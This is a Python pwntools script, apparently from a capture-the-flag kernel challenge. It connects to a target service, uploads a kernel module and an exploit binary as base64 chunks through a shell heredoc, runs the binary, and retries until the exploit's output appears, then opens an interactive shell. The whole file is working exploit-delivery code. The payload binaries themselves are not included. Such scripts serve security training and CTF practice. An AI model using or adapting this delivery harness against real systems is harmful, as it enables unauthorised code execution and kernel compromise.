#!/usr/bin/env python3

from pwn import *
import base64

serv = "localhost"
port = 5000

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        if args.GDB:
            r = process("gdb")
            sleep(0.3)
            r.sendline("so plain")
            #gdb.attach(r, gdbscript="""
            #""")
        else:
            r = process("./run")
    return r

r = None

def new():
    global r
    r = conn()
    pl = base64.b64encode(open("kfunc.ko", "rb").read())
    r.sendlineafter(b"#", b"cat<<EOF|base64 -d>/kfunc.ko")
    for i in range(0, len(pl), 0x100):
        r.sendlineafter(b">", pl[i:i+0x100])
    r.sendlineafter(b">", b"EOF")
    pl = base64.b64encode(open("pwn", "rb").read())
    r.sendlineafter(b"#", b"cat<<EOF|base64 -d>/pwn;chmod +x /pwn;/pwn")
    for i in range(0, len(pl), 0x100):
        r.sendlineafter(b">", pl[i:i+0x100])
    r.sendlineafter(b">", b"EOF")
    r.interactive()

def main():
    global r
    #new()
    #exit()
    #pl = base64.b64encode(open("pwn", "rb").read())
    #r.sendlineafter(b"$", b"cat<<EOF|base64 -d>/tmp/pwn;chmod +x /tmp/pwn;/tmp/pwn")
    #for i in range(0, len(pl), 0x100):
    #    r.sendlineafter(b">", pl[i:i+0x100])
    #r.sendlineafter(b">", b"EOF")
    done = 0
    for i in range(0x10):
        print(f"trial {i}")
        r = conn()
        #r.sendlineafter(b"#", "/pwn")
        try:
            pl = base64.b64encode(open("kfunc.ko", "rb").read())
            r.sendlineafter(b"#", b"cat<<EOF|base64 -d>/kfunc.ko")
            for i in range(0, len(pl), 0x100):
                r.sendlineafter(b">", pl[i:i+0x100])
            r.sendlineafter(b">", b"EOF")
            pl = base64.b64encode(open("pwn", "rb").read())
            r.sendlineafter(b"#", b"cat<<EOF|base64 -d>/pwn;chmod +x /pwn;/pwn")
            for i in range(0, len(pl), 0x100):
                r.sendlineafter(b">", pl[i:i+0x100])
            r.sendlineafter(b">", b"EOF")

            dat = r.recvuntil(b"theap =", timeout=5)
            if dat:
                r.interactive()
                done = 1
            else:
                r.close()
        except:
            r.close()
            pass
        if done:
            break


if __name__ == "__main__":
    main()
